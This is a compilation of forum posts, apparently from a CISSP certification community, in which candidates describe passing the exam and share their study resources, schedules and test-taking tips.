I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

On 6/12/2021 I managed to get a free voucher to take the CISSP exam, but it was set to expire at the end of August. I booked an exam at a local test center on 8/18/2021. I spent $0 on additional resources. I did get the ISC2 Official Practice Test book from a coworker who has his cert. My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones. I took the official practice tests for the videos I did watch and I was scoring in the 70%-80% range. I probably spent \~20-25 hours studying for the exam in total.

At the end of the day, I either just got really lucky or experience actually does go a long way in preparing you for this exam (probably a little of both). If you're a professional in the field and have a reasonable amount of experience I would strongly suggest you just go for it because you may have a better chance of passing than you think (and maybe prepare a little better than I did).",2021-08-21

2818,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions.

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

\- more theory and few technical questions

\- watch out for technologies that might have or go by a different name

\- there are two techniques that might work for some of the questions which are: Consider the vague answer and choose the answer that does the other 3 options.

2842,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
2843,p4k8rc,Feeling unprepared for my upcoming test. Should I cancel?,"Update: Decided to go ahead and take the exam today despite feeling certain that I would fail. I ended up passing at 100 questions with about an hour to spare. I was actually quite surprised by how easy the exam was. This seems like an exam where the preparation is the most daunting part given the volume of info that you might encounter on the exam. Thanks for all the comments and advice prior to the exam!

Posted this elsewhere but looking for a few more opinions.

Thinking about cancelling my upcoming test (four days away). Was scoring in the 80's on the Sybex official practice exams and figured I was ready. Then I watched Larry Greenblatt's CISSP questions on youtube and got almost all of them wrong (always narrowed it down to the correct two and then chose the wrong one). Then I took Thor's Hard CISSP Questions exam on Udemy today and scored 60.  Perhaps I'm rushing the process. Been studying for about 10 weeks.

This would be my first attempt and is paid for. Any further attempts would be out of pocket, though the expense doesn't bother me too much. Any feedback would be much appreciated.",2021-08-15
2844,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.  If not, congrats to those who have been certified and good luck to those that are working towards!",2021-08-14
2845,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

2847,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads.

2854,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

2859,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that). And Isc2’s [Glossary,]( https://www.isc2.org/Certifications/CISSP/CISSP-Student-Glossary) to just ensure you are operating with the same language.",2021-08-10
2860,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

2864,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
